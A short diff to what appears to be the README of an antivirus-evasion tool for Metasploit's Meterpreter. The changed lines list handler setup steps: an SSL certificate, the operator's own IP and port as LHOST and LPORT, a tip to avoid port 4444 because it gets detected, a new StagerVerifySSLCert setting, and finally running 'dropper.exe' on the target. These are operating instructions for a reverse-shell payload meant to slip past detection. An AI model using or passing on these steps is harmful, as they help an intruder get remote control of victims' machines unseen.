@@ -24,7 +24,8 @@ This is a way that today 10/10/2023, gets the meterpreter shellcode executed wit
         3) set HANDLERSSLCERTIFICATE path_to_pem.pem
         4) set LHOST <YOUR_IP>
         5) set LPORT <YOUR_PORT>   (avoid port 4444, it gets detected as it is the standard metasploit port)
-        6) run
+        6) set StagerVerifySSLCert true
+        7) run
 
 4) just execute the dropper.exe
   
